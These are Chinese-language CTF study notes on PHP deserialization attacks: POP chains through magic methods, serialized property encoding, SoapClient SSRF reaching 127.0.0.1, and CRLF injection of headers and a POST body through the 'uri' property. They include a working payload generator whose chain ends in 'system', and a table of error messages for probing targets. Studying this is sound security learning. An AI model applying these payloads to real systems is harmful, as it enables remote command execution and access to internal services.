## 二、知识点

### 1. POP 链（属性导向编程）

- **是什么**：用"属性值"串起多个类的魔术方法，从自动触发的**起点**走到有危害的**终点**
- **为什么叫属性导向**：攻击者唯一能控制的就是"属性里装什么对象"
- **起点**：`__destruct`（脚本结束自动触发）/ `__wakeup`（unserialize 时）
- **终点**：`echo $flag` / `system` / `eval` / `if(条件)`

### 2. 三种"接力动作"

| 动作 | 触发的魔术方法 |
|---|---|
| 调不存在的方法 | `__call` |
| 对象当字符串（`.` 拼接 / `echo`） | `__toString` |
| 读不可访问的属性（private） | `__get` |

### 3. 逆推法

从终点开始，每一步问两个问题：
- 谁调用了这个方法？（搜"方法名("）
- 魔术方法的触发条件是什么？

一直推到"自动触发的魔术方法"就是起点。

### 4. 序列化只存属性，不存方法

- 可见性决定序列化后的属性名：`public` → `名`；`protected` → `\0*\0名`；`private` → `\0类名\0名`
- **长度要算上空字节**：`\0*\0filename` = 11

### 5. PHP 内置类反序列化（没有自定义类时用）

- 枚举所有内置类的魔术方法：`get_declared_classes()` + `get_class_methods()`
- **`SoapClient`**：`__call` → 发 HTTP 请求 → **SSRF**
- `Error`/`Exception`：`__toString`（XSS）
- `SimpleXMLElement`：`__construct`（XXE）
- `SplFileObject`：读文件

### 6. SSRF 与 REMOTE_ADDR

- **`REMOTE_ADDR` 是 TCP 连接的源地址** → **HTTP 头改不了**（XFF/X-Real-IP 全无效）
- 唯一办法：**让服务器自己发请求**

### 7. `uri` 属性的 CRLF 注入

- `SoapClient` 把 `uri` 拼进 `SOAPAction` 头
- `uri` 里含 `\r\n` → 可**注入任意 HTTP 头和 POST body**
- **⚠️ `user_agent` 属性在 PHP 5.5 无效**（网上写法是 PHP 7 的）

## 三、案例 / payload

### 1. un8 POP 链 payload

```php
<?php
class a { public $object; public $ls; }
class b {
    protected $filename;
    public function __construct($f = null) { $this->filename = $f; }
}
class c {
    private $string;
    public function __construct($s = null) { $this->string = $s; }
}

$a1 = new a();  $a1->ls = ["system"];              // 终点数据
$c1 = new c(["string" => [$a1, "resolve"]]);       // c → a1
$a2 = new a();  $a2->object = $c1;                 // a2 → c1
$b  = new b($a2);                                  // b → a2
$a3 = new a();  $a3->object = $b;                  // a3 → b（起点）

echo urlencode(serialize($a3)), "\n";              // ⚠️ serialize 起点对象
exit(0);
```

**说明**：链条 `a::__destruct` → `b::__call` → `b::addMe` → `a::__toString` → `c::__get` → `a::resolve`

### 2. SoapClient SSRF payload

```
O:10:"SoapClient":2:{s:3:"uri";s:1:"x";s:8:"location";s:25:"http://127.0.0.1/un92.php";}
```

**说明**：`$a->pyflag()` 调不存在的方法 → 触发 `__call` → 向 `location` 发请求，源地址是 127.0.0.1

### 3. `uri` CRLF 注入

```php
$uri = "aaab\r\nX-Test-Injected: HELLO123";
// → 注入任意 HTTP 头

$uri = "aaab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 17\r\n\r\nINJECTED_BODY=YES";
// → 完全控制 POST body
```

### 4. 报错探测（判断 SSRF 目标状态）

| 报错 | 含义 |
|---|---|
| `looks like we got no XML document` | 有服务、有响应 |
| `[HTTP] Not Found` | 有服务、路径 404 |
| `[HTTP] Could not connect to host` | 端口不通 |
| `Unknown protocol` | 协议被禁（只允许 http/https） |

## 四、踩坑点

| 问题 | 原因 | 解决 |
|---|---|---|
| `Allowed memory size exhausted` | 删了 `addMe` 但保留 `__call` → 拼出的方法名找不到 → 再进 `__call` → 方法名无限增长 | **`__call` 和目标方法必须共存** |
| 链条走不动 | `serialize` 写成了终点数据对象 `$a1` | **serialize 起点对象 `$a3`** |
| `Parse error: unexpected token` | 赋值语句末尾缺分号 | **报错行的上一行**往往是问题所在 |
| `user_agent` 设了没用 | **PHP 5.5 的 `SoapClient` 不认这个属性**，UA 固定 `PHP-SOAP/5.5.38` | 改用 **`uri` 属性**注入 |
| `location` 注入 CRLF 无效 | 会被当成 URL 的一部分 → 404 | CRLF 只能从 **`uri`** 注入 |
| un92 不请求 url | 参数无论怎么传，响应长度都一样（329） | **未解决**，flag 在响应体里被 SoapClient 解析失败吞掉 |
